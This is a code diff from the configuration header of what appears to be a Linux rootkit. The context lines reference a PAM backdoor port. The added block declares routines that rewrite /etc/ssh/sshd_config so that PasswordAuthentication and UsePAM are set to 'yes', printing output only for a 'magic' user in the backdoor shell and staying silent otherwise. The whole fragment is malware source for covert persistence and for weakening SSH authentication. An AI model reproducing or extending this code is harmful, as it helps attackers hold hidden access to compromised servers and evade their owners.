@@ -16,4 +16,34 @@ void pam_vsyslog(const pam_handle_t *pamh, int priority, const char *fmt, va_lis
  * user knows which port is and isn't for the PAM
  * backdoor. */
 #define PAM_PORT ??PAM_PORT?? // [USE_PAM_BD]
+
+#ifdef PATCH_SSHD_CONFIG
+
+/* is the size of /etc/ssh/sshd_config's contents
+ * is larger than this number, only allocate memory
+ * for up to this number. default limit is 8kb. comment out
+ * to disable this & allocate the memory regardless of size.
+ * not sure even this much is necessary tbh... */
+#define MAX_SSHD_SIZE 1024 * 8
+
+#define MAGIC_USR 1 // sshdpatch will print stuff out when called from backdoor shell..
+#define REG_USR   2 // stays totally quiet otherwise.
+
+static char *const patchtargets[2] = {"PasswordAuthentication",
+                                      "UsePAM"};
+static char *const antival[sizeofarr(patchtargets)]   = {"no",  // what we don't want.
+                                                         "no"};
+static char *const targetval[sizeofarr(patchtargets)] = {"yes", // what we do want.
+                                                         "yes"};
+
+/* stores /etc/ssh/sshd_config contents. */
+static char *sshdcontents = NULL;
+
+int sshdok(int res[], char **buf, size_t *sshdsize);
+void sshdpatch(int mode);
+#define SSHD_CONFIG "??SSHD_CONFIG??"
+#include "sshdpatch/sshdchk.c"
+
+#endif
+
 #endif
